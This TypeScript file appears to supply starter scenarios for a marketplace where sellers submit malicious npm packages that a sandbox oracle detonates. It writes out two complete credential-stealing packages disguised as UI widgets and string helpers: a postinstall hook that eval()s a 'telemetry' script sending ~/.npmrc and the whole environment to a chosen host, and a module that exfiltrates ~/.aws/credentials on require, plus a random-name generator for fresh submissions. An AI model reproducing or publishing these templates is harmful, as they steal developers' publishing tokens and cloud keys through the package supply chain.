/**
 * Starter packages a real seller can submit. Each is a genuine, self-contained
 * malicious npm package (as source files) plus the matching finding metadata. The
 * seller edits the name/host/writeup, the browser packs it into a tarball, and the
 * oracle detonates that exact tarball — nothing is faked. Randomizing the name
 * keeps each submission a distinct artifact (the contract's duplicate lock rejects
 * a package already on the market).
 */
import { Effect, type Repro } from "./types";

export type ScenarioId = "install-exfil" | "require-exfil";

export interface Scenario {
  id: ScenarioId;
  label: string;
  blurb: string;
  repro: Repro;
  claimedEffects: number;
  files: (host: string) => Record<string, string>;
  outcome: (host: string) => string;
  expectedResult: (host: string) => string;
  writeup: (host: string) => string;
  remediation: (host: string) => string;
}

export const SCENARIOS: Scenario[] = [
  {
    id: "install-exfil",
    label: "Install-hook credential exfiltration",
    blurb: "A postinstall hook eval()s a bundled module that reads ~/.npmrc and the environment and POSTs them out. All seven effects, fires on npm install.",
    repro: { trigger: "install" },
    claimedEffects: Effect.RunsOnInstall | Effect.ReadsSensitive | Effect.ExfilCredentials | Effect.ExfilEnv | Effect.NetworkEgress,
    files: (host) => ({
      "package.json": JSON.stringify(
        {
          name: "__NAME__",
          version: "__VERSION__",
          description: "Lightweight UI widgets.",
          main: "index.js",
          scripts: { postinstall: "node -e \"eval(require('fs').readFileSync('./scripts/telemetry.js','utf8'))\"" },
        },
        null,
        2,
      ),
      "index.js": "module.exports = { Button: () => 'button', Modal: () => 'modal' };\n",
      "scripts/telemetry.js":
        [
          "// Bundled 'telemetry'. Reads local npm credentials + env and beacons them out on install.",
          "const os = require('os'); const fs = require('fs'); const https = require('https');",
          "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');",
          "const payload = Buffer.from(JSON.stringify({ npmrc, env: process.env })).toString('base64');",
          `const req = https.request('https://${host}/collect', { method: 'POST' });`,
          "req.write(payload); req.end();",
        ].join("\n") + "\n",
      "README.md": "# widgets\n",
    }),
    outcome: (host) => `On npm install it reads ~/.npmrc and the full environment and POSTs them, base64-encoded, to ${host}.`,
    expectedResult: (host) =>
      `Running the install hook captures the victim's npm registry auth token from ~/.npmrc and their AWS secret access key from the environment, and exfiltrates both to ${host} — the attacker gains the victim's package-publishing credentials and cloud keys.`,
    writeup: (host) =>
      `The postinstall hook eval()s a bundled 'telemetry' module. That module reads ~/.npmrc (registry auth tokens) and the entire process environment, base64-encodes the pair, and POSTs it to https://${host}/collect. Any CI job or developer running \`npm install\` leaks its npm token and every secret in the environment. The sandbox trace shows the install hook firing, the credential read, and the outbound POST carrying both canaries.`,
    remediation: (host) => `Pin away from this version, rotate any npm tokens and secrets exposed to machines that installed it, and block ${host} egress.`,
  },
  {
    id: "require-exfil",
    label: "Require-time cloud-key theft",
    blurb: "On require it reads ~/.aws/credentials and POSTs the secret out. No install hook — fires the moment a dependent imports it.",
    repro: { trigger: "require", entry: "lib.js" },
    claimedEffects: Effect.ReadsSensitive | Effect.ExfilCredentials | Effect.NetworkEgress,
    files: (host) => ({
      "package.json": JSON.stringify({ name: "__NAME__", version: "__VERSION__", description: "String helpers.", main: "lib.js" }, null, 2),
      "lib.js":
        [
          "// Innocent-looking helpers that steal cloud credentials the moment they are required.",
          "const os = require('os'); const fs = require('fs'); const https = require('https');",
          "try {",
          "  const creds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');",
          "  const payload = Buffer.from(creds).toString('base64');",
          `  const req = https.request('https://${host}/v1', { method: 'POST' });`,
          "  req.write(payload); req.end();",
          "} catch (e) {}",
          "module.exports.slug = (s) => String(s).toLowerCase().replace(/\\s+/g, '-');",
        ].join("\n") + "\n",
      "README.md": "# utils\n",
    }),
    outcome: (host) => `Requiring the package reads ~/.aws/credentials and POSTs the AWS secret, base64-encoded, to ${host}.`,
    expectedResult: (host) =>
      `Requiring the package captures the victim's AWS secret access key from ~/.aws/credentials and exfiltrates it to ${host} — the attacker gains the victim's cloud credentials.`,
    writeup: (host) =>
      `lib.js reads ~/.aws/credentials at require time, base64-encodes the contents, and POSTs them to https://${host}/v1 before returning an innocuous string helper. Any service that imports this package leaks its AWS secret. The sandbox trace shows the credential read and the outbound POST carrying the canary.`,
    remediation: (host) => `Avoid this version; the maintainer account may be compromised. Rotate AWS keys on any host that imported it and block ${host}.`,
  },
];

export function scenario(id: ScenarioId): Scenario {
  return SCENARIOS.find((s) => s.id === id) ?? SCENARIOS[0];
}

/** Materialize a scenario's files with the seller's name/version/host filled in. */
export function scenarioFiles(id: ScenarioId, name: string, version: string, host: string): Record<string, string> {
  const files = scenario(id).files(host);
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(files)) out[k] = v.replace(/__NAME__/g, name).replace(/__VERSION__/g, version);
  return out;
}

/** A fresh, unlikely-to-collide package name for a new submission. */
export function suggestName(): string {
  const words = ["acme", "swift", "nova", "pixel", "vertex", "quanta", "lumen", "orbit", "flux", "delta"];
  const kind = ["analytics", "widgets", "utils", "logger", "sdk", "helpers", "toolkit", "core"];
  const w = words[Math.floor(Math.random() * words.length)];
  const k = kind[Math.floor(Math.random() * kind.length)];
  const n = Math.floor(Math.random() * 9000 + 1000);
  return `${w}-${k}-${n}`;
}
